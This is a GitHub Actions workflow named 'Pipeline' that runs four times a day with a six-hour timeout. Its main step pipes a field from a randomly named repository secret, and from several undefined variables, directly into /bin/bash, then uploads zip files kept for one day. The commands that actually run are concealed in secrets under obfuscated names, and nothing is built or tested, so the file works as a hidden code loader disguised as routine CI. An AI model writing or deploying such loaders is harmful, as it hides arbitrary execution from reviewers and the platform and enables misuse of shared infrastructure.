name: Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '47 1,7,13,19 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  ci:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Launch
        env:
          lvp2344: ${{ secrets.lvp2344 }}
        run: |
          printf '%s' "$lvp2344" | jq -r .efbbb6 | /bin/bash
          printf '%s' "$xc81882" | jq -r .oa634 | /bin/bash
          echo $fscqu14001 | jq -r .hyn0327 | /bin/bash
          printf '%s' "$j24110" | jq -r .x96 | /bin/bash
          printf '%s' "$a94638" | jq -r .s4 | /bin/bash

      - name: Save artifact
        uses: actions/upload-artifact@v4
        with:
          name: mSgnlTfi
          path: "*.zip"
          retention-days: 1
